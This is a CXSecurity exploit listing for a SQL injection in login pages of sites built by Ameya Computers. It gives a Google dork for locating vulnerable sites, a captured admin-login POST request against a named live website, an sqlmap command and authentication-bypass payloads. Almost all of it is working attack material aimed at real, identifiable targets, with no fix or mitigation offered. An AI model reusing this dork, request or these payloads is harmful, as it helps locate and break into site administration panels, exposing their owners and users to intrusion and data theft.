---
title: Developed by Ameya Computers LOGIN SQL INJECTİON
url: https://cxsecurity.com/issue/WLB-2023020024
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-15
fetch_date: 2025-10-04T06:36:12.918132
---

# Developed by Ameya Computers LOGIN SQL INJECTİON

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Developed by Ameya Computers LOGIN SQL INJECTİON**  **2023.02.14**  **![tr](https://cert.cx/cxstatic/images/flags/tr.png) [sc0field](https://cxsecurity.com/author/sc0field/1/) **(TR)** ![tr](https://cert.cx/cxstatic/images/flags/tr.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A**  **[**Dork:** intext:Developed by : Ameya Computers inurl:login.php](https://cxsecurity.com/dorks/)** | |

# Exploit Author : sc0field
# Exploit Date : 2023-02-13
# Exploit Title : Developed by Ameya Computers LOGIN SQL INJECTİON
# Google Dork : intext:Developed by : Ameya Computers inurl:login.php
Live :
SQL Request :
POST /reviews/admin/login.php HTTP/1.1
Host: jeevanrekhaayurved.com
Cookie: PHPSESSID=oisalk8pvefn8rgdb6p1k3j5uq
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: https://jeevanrekhaayurved.com
Referer: https://jeevanrekhaayurved.com/reviews/admin/login.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
user\_name=%payload%&password=%payload%&login=LOGIN
Exploit:
sqlmap -r request.txt -p user\_name && -p password --batch
\*\*Payload ->
Username payload : admin'%20or%20'1'%3d'1'--
Password payload : '-'
Error : mysql\_num\_rows() syntax
###########################################HACKTIVIZM.ORG#######################################

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020024)

[Tweet](https://twitter.com/share)

Vote for this issue:
 2
 -1

66%

34%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top